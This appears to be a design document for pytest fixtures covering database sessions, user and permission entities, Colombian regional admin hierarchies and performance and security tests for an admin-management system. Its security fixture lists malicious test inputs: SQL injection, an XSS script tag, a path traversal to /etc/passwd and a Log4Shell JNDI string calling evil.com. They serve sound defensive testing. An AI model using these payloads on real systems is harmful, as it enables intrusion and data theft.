# ADMIN MANAGEMENT FIXTURES HIERARCHY

**Test Architect**: Fixtures Strategy
**Target**: Comprehensive fixture design for admin_management testing
**Principle**: DRY, Isolation, Performance, Reusability
**Date**: 2025-09-21

## 🏗️ FIXTURES ARCHITECTURE OVERVIEW

### Hierarchy Design Principles

**1. Scope-Based Organization**
```
Session Scope (Expensive, Shared)
    ↓
Module Scope (Test Suite Level)
    ↓
Class Scope (Test Class Level)
    ↓
Function Scope (Individual Test)
```

**2. Dependency-Based Layering**
```
Infrastructure Layer (Database, Redis, External Services)
    ↓
Core Entity Layer (Users, Permissions, Departments)
    ↓
Relationship Layer (User-Permission Associations)
    ↓
Business Logic Layer (Admin Hierarchies, Workflows)
    ↓
Test Data Layer (Specific Test Scenarios)
```

**3. Colombian Business Context Integration**
```
Base Fixtures
    ↓
Colombian Legal Compliance
    ↓
Regional Business Rules
    ↓
Department-Specific Logic
    ↓
Real-World Scenarios
```

## 🔧 INFRASTRUCTURE LAYER FIXTURES

### Database & Session Management

```python
# conftest.py - Infrastructure Layer

import pytest
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker
from app.core.database import Base, get_db
from app.main import app

@pytest.fixture(scope="session")
def test_db_engine():
    """Session-scoped database engine for all tests"""
    engine = create_async_engine(
        "postgresql+asyncpg://test_user:test_pass@localhost/admin_test_db",
        echo=False,  # Set to True for SQL debugging
        pool_pre_ping=True,
        pool_size=10,
        max_overflow=20
    )
    return engine

@pytest.fixture(scope="session", autouse=True)
async def setup_test_database(test_db_engine):
    """Setup test database schema once per session"""
    async with test_db_engine.begin() as conn:
        await conn.run_sync(Base.metadata.create_all)

    yield

    # Cleanup after all tests
    async with test_db_engine.begin() as conn:
        await conn.run_sync(Base.metadata.drop_all)

@pytest.fixture(scope="function")
async def db_session(test_db_engine) -> AsyncSession:
    """Function-scoped database session with transaction rollback"""

    async_session = sessionmaker(
        test_db_engine,
        class_=AsyncSession,
        expire_on_commit=False
    )

    async with async_session() as session:
        # Start transaction
        async with session.begin():
            # Override app dependency
            app.dependency_overrides[get_db] = lambda: session

            try:
                yield session
            finally:
                # Rollback transaction (automatic cleanup)
                await session.rollback()
                # Clear dependency override
                app.dependency_overrides.clear()

@pytest.fixture(scope="function")
async def isolated_db_session(test_db_engine) -> AsyncSession:
    """Completely isolated database session for concurrent tests"""

    async_session = sessionmaker(
        test_db_engine,
        class_=AsyncSession,
        expire_on_commit=False
    )

    async with async_session() as session:
        # Use savepoint for nested transaction isolation
        savepoint = await session.begin_nested()

        try:
            yield session
        finally:
            await savepoint.rollback()
```

### Redis & Cache Management

```python
@pytest.fixture(scope="session")
def redis_client():
    """Session-scoped Redis client for caching tests"""
    import redis.asyncio as redis

    client = redis.from_url(
        "redis://localhost:6379/15",  # Use dedicated test database
        encoding="utf-8",
        decode_responses=True
    )

    yield client

    # Cleanup
    asyncio.run(client.flushdb())
    asyncio.run(client.close())

@pytest.fixture(scope="function")
async def clean_redis(redis_client):
    """Function-scoped Redis cleanup"""
    # Clean before test
    await redis_client.flushdb()

    yield redis_client

    # Clean after test
    await redis_client.flushdb()
```

## 👥 CORE ENTITY LAYER FIXTURES

### User Entity Fixtures

```python
# fixtures/core_entities.py

@pytest.fixture(scope="module")
def base_user_data():
    """Module-scoped base user data template"""
    return {
        'nombre': 'Test',
        'apellido': 'User',
        'is_active': True,
        'is_verified': True,
        'habeas_data_accepted': True,
        'data_processing_consent': True,
        'performance_score': 100,
        'failed_login_attempts': 0,
        'account_locked': False,
        'requires_password_change': False
    }

@pytest.fixture(scope="function")
def superuser_data(base_user_data):
    """Function-scoped SUPERUSER data"""
    return {
        **base_user_data,
        'email': 'superuser@test.com',
        'user_type': UserType.SUPERUSER,
        'security_clearance_level': 5,
        'department_id': 'HEADQUARTERS',
        'employee_id': 'SUP001'
    }

@pytest.fixture(scope="function")
def admin_data(base_user_data):
    """Function-scoped ADMIN user data"""
    return {
        **base_user_data,
        'email': 'admin@test.com',
        'user_type': UserType.ADMIN,
        'security_clearance_level': 3,
        'department_id': 'GENERAL',
        'employee_id': 'ADM001'
    }

@pytest.fixture(scope="function")
def regional_admin_data(base_user_data):
    """Function-scoped regional admin data"""
    return {
        **base_user_data,
        'email': 'regional@test.com',
        'user_type': UserType.ADMIN,
        'security_clearance_level': 4,
        'department_id': 'ANTIOQUIA',
        'employee_id': 'REG001',
        'ciudad': 'Medellín',
        'departamento': 'Antioquia'
    }

@pytest.fixture(scope="function")
async def superuser(db_session, superuser_data):
    """Function-scoped SUPERUSER entity"""
    user = User(**superuser_data)
    db_session.add(user)
    await db_session.flush()
    return user

@pytest.fixture(scope="function")
async def admin_user(db_session, admin_data):
    """Function-scoped ADMIN user entity"""
    user = User(**admin_data)
    db_session.add(user)
    await db_session.flush()
    return user

@pytest.fixture(scope="function")
async def regional_admin(db_session, regional_admin_data):
    """Function-scoped regional admin entity"""
    user = User(**regional_admin_data)
    db_session.add(user)
    await db_session.flush()
    return user
```

### Permission Entity Fixtures

```python
@pytest.fixture(scope="module")
def base_permissions():
    """Module-scoped base permission definitions"""
    return [
        {
            'name': 'users.create.global',
            'description': 'Create users globally',
            'resource_type': ResourceType.USERS,
            'action': PermissionAction.CREATE,
            'scope': PermissionScope.GLOBAL,
            'required_clearance': 4
        },
        {
            'name': 'users.read.global',
            'description': 'Read users globally',
            'resource_type': ResourceType.USERS,
            'action': PermissionAction.READ,
            'scope': PermissionScope.GLOBAL,
            'required_clearance': 3
        },
        {
            'name': 'users.update.global',
            'description': 'Update users globally',
            'resource_type': ResourceType.USERS,
            'action': PermissionAction.UPDATE,
            'scope': PermissionScope.GLOBAL,
            'required_clearance': 3
        },
        {
            'name': 'users.delete.global',
            'description': 'Delete users globally',
            'resource_type': ResourceType.USERS,
            'action': PermissionAction.DELETE,
            'scope': PermissionScope.GLOBAL,
            'required_clearance': 5
        },
        {
            'name': 'users.manage.global',
            'description': 'Full user management globally',
            'resource_type': ResourceType.USERS,
            'action': PermissionAction.MANAGE,
            'scope': PermissionScope.GLOBAL,
            'required_clearance': 4
        }
    ]

@pytest.fixture(scope="module")
def regional_permissions():
    """Module-scoped regional permission definitions"""
    regions = ['ANTIOQUIA', 'CUNDINAMARCA', 'VALLE_DEL_CAUCA', 'ATLANTICO', 'SANTANDER']
    permissions = []

    for region in regions:
        permissions.extend([
            {
                'name': f'users.manage.{region.lower()}',
                'description': f'Manage users in {region}',
                'resource_type': ResourceType.USERS,
                'action': PermissionAction.MANAGE,
                'scope': PermissionScope.REGIONAL,
                'required_clearance': 3
            },
            {
                'name': f'vendors.approve.{region.lower()}',
                'description': f'Approve vendors in {region}',
                'resource_type': ResourceType.VENDORS,
                'action': PermissionAction.APPROVE,
                'scope': PermissionScope.REGIONAL,
                'required_clearance': 3
            }
        ])

    return permissions

@pytest.fixture(scope="function")
async def permission_set(db_session, base_permissions):
    """Function-scoped basic permission set"""
    permissions = []

    for perm_data in base_permissions:
        permission = AdminPermission(**perm_data)
        db_session.add(permission)
        permissions.append(permission)

    await db_session.flush()
    return permissions

@pytest.fixture(scope="function")
async def full_permission_set(db_session, base_permissions, regional_permissions):
    """Function-scoped complete permission set"""
    all_permissions = base_permissions + regional_permissions
    permissions = []

    for perm_data in all_permissions:
        permission = AdminPermission(**perm_data)
        db_session.add(permission)
        permissions.append(permission)

    await db_session.flush()
    return permissions
```

## 🔗 RELATIONSHIP LAYER FIXTURES

### User-Permission Association Fixtures

```python
@pytest.fixture(scope="function")
async def admin_with_basic_permissions(db_session, admin_user, permission_set):
    """Admin user with basic permissions"""

    # Grant basic permissions
    basic_permission_names = ['users.read.global', 'users.update.global']

    for permission in permission_set:
        if permission.name in basic_permission_names:
            # Create user-permission association
            association = AdminUserPermission(
                user_id=admin_user.id,
                permission_id=permission.id,
                granted_by_id=admin_user.id,  # Self-granted for test
                granted_at=datetime.utcnow(),
                is_active=True
            )
            db_session.add(association)

    await db_session.flush()
    return admin_user

@pytest.fixture(scope="function")
async def superuser_with_all_permissions(db_session, superuser, full_permission_set):
    """SUPERUSER with all available permissions"""

    for permission in full_permission_set:
        association = AdminUserPermission(
            user_id=superuser.id,
            permission_id=permission.id,
            granted_by_id=superuser.id,
            granted_at=datetime.utcnow(),
            is_active=True
        )
        db_session.add(association)

    await db_session.flush()
    return superuser

@pytest.fixture(scope="function")
async def regional_admin_with_regional_permissions(db_session, regional_admin, full_permission_set):
    """Regional admin with department-specific permissions"""

    # Grant regional permissions for ANTIOQUIA
    regional_permission_names = [
        'users.manage.antioquia',
        'vendors.approve.antioquia',
        'users.read.global'  # Plus basic read access
    ]

    for permission in full_permission_set:
        if permission.name in regional_permission_names:
            association = AdminUserPermission(
                user_id=regional_admin.id,
                permission_id=permission.id,
                granted_by_id=regional_admin.id,
                granted_at=datetime.utcnow(),
                is_active=True
            )
            db_session.add(association)

    await db_session.flush()
    return regional_admin
```

## 🏢 BUSINESS LOGIC LAYER FIXTURES

### Colombian Department Hierarchy Fixtures

```python
@pytest.fixture(scope="module")
def colombian_departments():
    """Module-scoped Colombian department data"""
    return {
        'ANTIOQUIA': {
            'capital': 'Medellín',
            'region': 'Andina',
            'timezone': 'America/Bogota',
            'business_hours': '08:00-18:00',
            'admin_count': 3
        },
        'CUNDINAMARCA': {
            'capital': 'Bogotá',
            'region': 'Andina',
            'timezone': 'America/Bogota',
            'business_hours': '08:00-18:00',
            'admin_count': 5
        },
        'VALLE_DEL_CAUCA': {
            'capital': 'Cali',
            'region': 'Pacífica',
            'timezone': 'America/Bogota',
            'business_hours': '08:00-18:00',
            'admin_count': 3
        },
        'ATLANTICO': {
            'capital': 'Barranquilla',
            'region': 'Caribe',
            'timezone': 'America/Bogota',
            'business_hours': '08:00-18:00',
            'admin_count': 2
        },
        'SANTANDER': {
            'capital': 'Bucaramanga',
            'region': 'Andina',
            'timezone': 'America/Bogota',
            'business_hours': '08:00-18:00',
            'admin_count': 2
        }
    }

@pytest.fixture(scope="function")
async def complete_department_hierarchy(db_session, full_permission_set, colombian_departments):
    """Complete Colombian department admin hierarchy"""

    hierarchy = {
        'ceo': None,
        'regional_managers': {},
        'department_staff': {},
        'total_admins': 0
    }

    # Create CEO (SUPERUSER)
    ceo_data = {
        'email': 'ceo@mestore.com',
        'nombre': 'Miguel',
        'apellido': 'Rodriguez',
        'user_type': UserType.SUPERUSER,
        'security_clearance_level': 5,
        'department_id': 'HEADQUARTERS',
        'employee_id': 'CEO001',
        'is_active': True,
        'is_verified': True,
        'habeas_data_accepted': True,
        'data_processing_consent': True
    }

    ceo = User(**ceo_data)
    db_session.add(ceo)
    await db_session.flush()

    # Grant all permissions to CEO
    for permission in full_permission_set:
        association = AdminUserPermission(
            user_id=ceo.id,
            permission_id=permission.id,
            granted_by_id=ceo.id,
            granted_at=datetime.utcnow(),
            is_active=True
        )
        db_session.add(association)

    hierarchy['ceo'] = ceo
    hierarchy['total_admins'] += 1

    # Create regional managers for each department
    for dept_code, dept_info in colombian_departments.items():
        manager_data = {
            'email': f'manager.{dept_code.lower()}@mestore.com',
            'nombre': f'Manager',
            'apellido': dept_info['capital'],
            'user_type': UserType.ADMIN,
            'security_clearance_level': 4,
            'department_id': dept_code,
            'employee_id': f'MGR{dept_code[:3]}001',
            'ciudad': dept_info['capital'],
            'departamento': dept_code.replace('_', ' ').title(),
            'is_active': True,
            'is_verified': True,
            'habeas_data_accepted': True,
            'data_processing_consent': True
        }

        manager = User(**manager_data)
        db_session.add(manager)
        await db_session.flush()

        # Grant regional permissions
        regional_permissions = [
            f'users.manage.{dept_code.lower()}',
            f'vendors.approve.{dept_code.lower()}',
            'users.read.global'
        ]

        for permission in full_permission_set:
            if permission.name in regional_permissions:
                association = AdminUserPermission(
                    user_id=manager.id,
                    permission_id=permission.id,
                    granted_by_id=ceo.id,
                    granted_at=datetime.utcnow(),
                    is_active=True
                )
                db_session.add(association)

        hierarchy['regional_managers'][dept_code] = manager
        hierarchy['total_admins'] += 1

        # Create department staff
        staff_list = []
        for i in range(dept_info['admin_count'] - 1):  # -1 because manager counts as one
            staff_data = {
                'email': f'staff.{dept_code.lower()}.{i+1}@mestore.com',
                'nombre': f'Staff{i+1}',
                'apellido': dept_info['capital'],
                'user_type': UserType.ADMIN,
                'security_clearance_level': 3,
                'department_id': dept_code,
                'employee_id': f'STF{dept_code[:3]}{i+1:03d}',
                'ciudad': dept_info['capital'],
                'departamento': dept_code.replace('_', ' ').title(),
                'is_active': True,
                'is_verified': True,
                'habeas_data_accepted': True,
                'data_processing_consent': True
            }

            staff = User(**staff_data)
            db_session.add(staff)
            await db_session.flush()

            # Grant basic permissions
            basic_permissions = ['users.read.global']

            for permission in full_permission_set:
                if permission.name in basic_permissions:
                    association = AdminUserPermission(
                        user_id=staff.id,
                        permission_id=permission.id,
                        granted_by_id=manager.id,
                        granted_at=datetime.utcnow(),
                        is_active=True
                    )
                    db_session.add(association)

            staff_list.append(staff)
            hierarchy['total_admins'] += 1

        hierarchy['department_staff'][dept_code] = staff_list

    await db_session.commit()
    return hierarchy
```

### Specialized Team Fixtures

```python
@pytest.fixture(scope="function")
async def crisis_response_team(db_session, full_permission_set):
    """Specialized crisis response admin team"""

    team = {}

    # Crisis Coordinator (highest authority)
    coordinator_data = {
        'email': 'crisis.coordinator@mestore.com',
        'nombre': 'Ana',
        'apellido': 'Security',
        'user_type': UserType.SUPERUSER,
        'security_clearance_level': 5,
        'department_id': 'SECURITY',
        'employee_id': 'CRS001',
        'is_active': True,
        'is_verified': True,
        'habeas_data_accepted': True,
        'data_processing_consent': True
    }

    coordinator = User(**coordinator_data)
    db_session.add(coordinator)
    await db_session.flush()

    # Security Specialist
    security_data = {
        'email': 'security.specialist@mestore.com',
        'nombre': 'Carlos',
        'apellido': 'Seguridad',
        'user_type': UserType.ADMIN,
        'security_clearance_level': 4,
        'department_id': 'SECURITY',
        'employee_id': 'SEC001',
        'is_active': True,
        'is_verified': True,
        'habeas_data_accepted': True,
        'data_processing_consent': True
    }

    security_specialist = User(**security_data)
    db_session.add(security_specialist)
    await db_session.flush()

    # Communications Manager
    comms_data = {
        'email': 'communications@mestore.com',
        'nombre': 'Maria',
        'apellido': 'Comunicaciones',
        'user_type': UserType.ADMIN,
        'security_clearance_level': 3,
        'department_id': 'COMMUNICATIONS',
        'employee_id': 'COM001',
        'is_active': True,
        'is_verified': True,
        'habeas_data_accepted': True,
        'data_processing_consent': True
    }

    comms_manager = User(**comms_data)
    db_session.add(comms_manager)
    await db_session.flush()

    # Grant crisis-specific permissions
    crisis_permissions = {
        coordinator.id: [
            'emergency.lockdown.execute',
            'users.bulk.suspend',
            'vendors.emergency.disable',
            'communications.broadcast.crisis',
            'audit.emergency.access',
            'compliance.report.immediate'
        ],
        security_specialist.id: [
            'emergency.lockdown.execute',
            'users.bulk.suspend',
            'vendors.emergency.disable',
            'audit.emergency.access'
        ],
        comms_manager.id: [
            'communications.broadcast.crisis'
        ]
    }

    # Create crisis permissions if they don't exist and grant them
    for user_id, permission_names in crisis_permissions.items():
        for perm_name in permission_names:
            # Find or create permission
            permission = next(
                (p for p in full_permission_set if p.name == perm_name),
                None
            )

            if not permission:
                permission = AdminPermission(
                    name=perm_name,
                    description=f"Crisis permission: {perm_name}",
                    resource_type=ResourceType.SYSTEM,
                    action=PermissionAction.EXECUTE,
                    scope=PermissionScope.GLOBAL,
                    required_clearance=4
                )
                db_session.add(permission)
                await db_session.flush()

            # Grant permission
            association = AdminUserPermission(
                user_id=user_id,
                permission_id=permission.id,
                granted_by_id=coordinator.id,
                granted_at=datetime.utcnow(),
                is_active=True
            )
            db_session.add(association)

    team['coordinator'] = coordinator
    team['security_specialist'] = security_specialist
    team['communications_manager'] = comms_manager

    await db_session.commit()
    return team
```

## 📊 TEST DATA LAYER FIXTURES

### Performance Testing Fixtures

```python
@pytest.fixture(scope="function")
async def bulk_admin_dataset(db_session, full_permission_set):
    """Large dataset for performance testing"""

    admin_count = 1000
    admins = []

    # Generate bulk admin data
    for i in range(admin_count):
        department = ['ANTIOQUIA', 'CUNDINAMARCA', 'VALLE_DEL_CAUCA'][i % 3]

        admin_data = {
            'email': f'bulk.admin.{i:04d}@test.com',
            'nombre': f'Admin{i:04d}',
            'apellido': 'Bulk',
            'user_type': UserType.ADMIN,
            'security_clearance_level': (i % 3) + 2,  # 2, 3, or 4
            'department_id': department,
            'employee_id': f'BLK{i:06d}',
            'is_active': True,
            'is_verified': True,
            'habeas_data_accepted': True,
            'data_processing_consent': True,
            'performance_score': 80 + (i % 20)  # 80-99
        }

        admin = User(**admin_data)
        admins.append(admin)

    # Bulk insert
    db_session.add_all(admins)
    await db_session.flush()

    return admins

@pytest.fixture(scope="function")
def stress_test_scenarios():
    """Stress test scenario configurations"""
    return {
        'concurrent_admin_creation': {
            'admin_count': 100,
            'concurrent_requests': 20,
            'max_response_time': 5.0
        },
        'permission_grant_stress': {
            'admin_count': 50,
            'permissions_per_admin': 10,
            'concurrent_operations': 25,
            'max_response_time': 2.0
        },
        'bulk_operation_limits': {
            'max_bulk_size': 100,
            'admin_count': 500,
            'operation_timeout': 30.0
        }
    }
```

### Security Testing Fixtures

```python
@pytest.fixture(scope="function")
def security_test_scenarios():
    """Security testing scenario data"""
    return {
        'privilege_escalation_attempts': [
            {
                'attacker_clearance': 2,
                'target_clearance': 5,
                'expected_result': 'BLOCKED'
            },
            {
                'attacker_clearance': 3,
                'target_clearance': 4,
                'expected_result': 'BLOCKED'
            }
        ],
        'malicious_inputs': [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "UNION SELECT * FROM admin_permissions",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
        ],
        'brute_force_scenarios': [
            {
                'failed_attempts': 5,
                'time_window': 300,  # 5 minutes
                'expected_lockout': True
            },
            {
                'failed_attempts': 10,
                'time_window': 60,   # 1 minute
                'expected_permanent_lock': True
            }
        ]
    }

@pytest.fixture(scope="function")
async def compromised_admin_scenario(db_session, admin_user):
    """Scenario with compromised admin account"""

    # Mark admin as potentially compromised
    admin_user.failed_login_attempts = 3
    admin_user.last_login = datetime.utcnow() - timedelta(days=30)
    admin_user.requires_password_change = True

    # Create suspicious activity logs
    suspicious_activities = [
        {
            'admin_user_id': admin_user.id,
            'action_type': AdminActionType.SECURITY,
            'action_description': 'Failed login from unusual location',
            'risk_level': RiskLevel.HIGH,
            'created_at': datetime.utcnow() - timedelta(hours=2)
        },
        {
            'admin_user_id': admin_user.id,
            'action_type': AdminActionType.USER_MANAGEMENT,
            'action_description': 'Attempted privilege escalation',
            'risk_level': RiskLevel.CRITICAL,
            'created_at': datetime.utcnow() - timedelta(hours=1)
        }
    ]

    for activity_data in suspicious_activities:
        activity = AdminActivityLog(**activity_data)
        db_session.add(activity)

    await db_session.flush()
    return admin_user
```

## 🔄 FIXTURE COMPOSITION PATTERNS

### Composite Fixtures for Complex Scenarios

```python
@pytest.fixture(scope="function")
async def complete_admin_ecosystem(
    db_session,
    complete_department_hierarchy,
    crisis_response_team,
    full_permission_set
):
    """Complete admin ecosystem for comprehensive testing"""

    ecosystem = {
        'hierarchy': complete_department_hierarchy,
        'crisis_team': crisis_response_team,
        'permissions': full_permission_set,
        'statistics': {
            'total_admins': complete_department_hierarchy['total_admins'] + len(crisis_response_team),
            'departments': len(complete_department_hierarchy['regional_managers']),
            'total_permissions': len(full_permission_set)
        }
    }

    return ecosystem

@pytest.fixture(scope="function")
async def admin_workflow_context(
    complete_admin_ecosystem,
    async_client,
    clean_redis
):
    """Complete context for admin workflow testing"""

    # Get CEO token for API operations
    ceo = complete_admin_ecosystem['hierarchy']['ceo']

    # Mock authentication token
    mock_token = f"test_token_{ceo.id}"

    # Setup API client with authentication
    admin_api = AdminManagementAPI(async_client, mock_token)

    context = {
        'ecosystem': complete_admin_ecosystem,
        'api_client': admin_api,
        'redis_client': clean_redis,
        'ceo': ceo,
        'primary_manager': list(complete_admin_ecosystem['hierarchy']['regional_managers'].values())[0]
    }

    return context
```

## 📋 FIXTURE USAGE GUIDELINES

### Best Practices

**1. Scope Selection**
```python
# Session scope for expensive, shared resources
@pytest.fixture(scope="session")
def database_engine(): pass

# Module scope for test suite setup
@pytest.fixture(scope="module")
def permission_templates(): pass

# Function scope for test isolation
@pytest.fixture(scope="function")
def admin_user(): pass
```

**2. Dependency Injection**
```python
# Explicit dependencies
@pytest.fixture
def admin_with_permissions(admin_user, permission_set):
    return setup_admin_permissions(admin_user, permission_set)

# Implicit dependencies via autouse
@pytest.fixture(autouse=True)
def setup_test_environment():
    # Setup code
    yield
    # Cleanup code
```

**3. Parametrization for Multiple Scenarios**
```python
@pytest.fixture(params=[
    {'clearance': 3, 'department': 'ANTIOQUIA'},
    {'clearance': 4, 'department': 'CUNDINAMARCA'},
    {'clearance': 5, 'department': 'HEADQUARTERS'}
])
def admin_scenarios(request):
    return request.param
```

### Performance Optimization

**1. Lazy Loading**
```python
@pytest.fixture
def expensive_dataset():
    """Only create when accessed"""
    def _create_dataset():
        return create_large_dataset()
    return _create_dataset
```

**2. Caching Results**
```python
@pytest.fixture(scope="module")
def cached_permission_set():
    """Cache expensive permission creation"""
    if not hasattr(cached_permission_set, '_cache'):
        cached_permission_set._cache = create_permission_set()
    return cached_permission_set._cache
```

## 🎯 IMPLEMENTATION ROADMAP

### Phase 1: Core Infrastructure (Week 1)
- ✅ Database session fixtures
- ✅ Redis client fixtures
- ⚠️ Basic entity fixtures
- 🔄 Environment configuration

### Phase 2: Business Logic Fixtures (Week 2)
- 🔄 Colombian department hierarchy
- 🔄 Permission relationship fixtures
- 🔄 User-permission associations
- 🔄 Workflow context fixtures

### Phase 3: Advanced Scenarios (Week 3)
- 🔄 Performance testing fixtures
- 🔄 Security testing fixtures
- 🔄 Crisis response scenarios
- 🔄 Composite fixtures

### Phase 4: Optimization & Documentation (Week 4)
- 🔄 Performance optimization
- 🔄 Usage documentation
- 🔄 Best practices guide
- 🔄 Team training materials

---

**Status**: Design Complete ✅
**Implementation**: Ready to begin
**Dependencies**: Database schema, Permission models
**Next**: Begin core infrastructure implementation